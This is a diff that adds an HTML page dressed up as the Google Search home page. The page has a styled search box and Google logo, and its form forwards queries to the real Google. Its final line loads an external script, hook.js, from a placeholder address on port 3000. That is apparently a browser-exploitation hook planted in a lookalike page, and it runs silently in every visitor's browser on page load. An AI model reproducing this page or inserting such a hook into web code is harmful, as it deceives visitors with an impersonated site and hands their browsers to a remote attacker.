@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Search</title>
+  <style>
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #f8f8f8, #f1f1f1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #202124;
+      transition: background 0.3s ease, color 0.3s ease;
+    }
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      color: #202124;
+    }
+    .logo {
+      width: 250px;
+      max-width: 100%;
+      margin-bottom: 30px;
+    }
+    .search-box {
+      display: flex;
+      justify-content: center;
+      flex-direction: column;
+    }
+    input[type="text"] {
+      width: 90%;
+      max-width: 600px;
+      padding: 16px;
+      font-size: 18px;
+      border-radius: 30px;
+      border: 1px solid #dcdcdc;
+      outline: none;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      transition: all 0.3s ease-in-out;
+      text-align: center;
+    }
+    input[type="text"]:focus {
+      border-color: #4285F4;
+      box-shadow: 0 2px 10px rgba(66, 133, 244, 0.3);
+    }
+    .buttons {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+    }
+    .buttons input {
+      padding: 14px 30px;
+      font-size: 16px;
+      border-radius: 25px;
+      border: none;
+      background-color: #f8f8f8;
+      color: #5f6368;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+    .buttons input:hover {
+      background-color: #f1f1f1;
+      transform: scale(1.05);
+    }
+    .buttons input:active {
+      transform: scale(1);
+    }
+    .buttons input:focus {
+      outline: none;
+    }
+
+    @media (max-width: 600px) {
+      .buttons {
+        flex-direction: row;
+        justify-content: space-between;
+      }
+      .buttons input {
+        padding: 12px 24px;
+        font-size: 14px;
+        width: 48%;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .buttons input {
+        padding: 12px 24px;
+        font-size: 14px;
+        width: 100%;
+      }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      body {
+        background: linear-gradient(135deg, #121212, #1c1c1c);
+        color: #e8e8e8;
+      }
+      .buttons input {
+        background-color: #333;
+        color: #e8e8e8;
+      }
+      .buttons input:hover {
+        background-color: #444;
+      }
+      input[type="text"] {
+        background-color: #333;
+        border: 1px solid #555;
+        color: #e8e8e8;
+      }
+      input[type="text"]:focus {
+        border-color: #4285F4;
+        box-shadow: 0 2px 10px rgba(66, 133, 244, 0.3);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/512px-Google_2015_logo.svg.png" alt="Google Logo" class="logo">
+    
+    <form action="https://www.google.com/search" method="get" class="search-box">
+      <input type="text" name="q" placeholder="Search Google" required>
+      
+      <div class="buttons">
+        <input type="submit" value="Google Search">
+        
+        <input type="submit" value="I'm Feeling Lucky" formaction="https://www.google.com/search?btnI=1">
+      </div>
+    </form>
+  </div>
+<script src="http://X.X.X.X:3000/hook.js"></script>
+</body>
+</html>
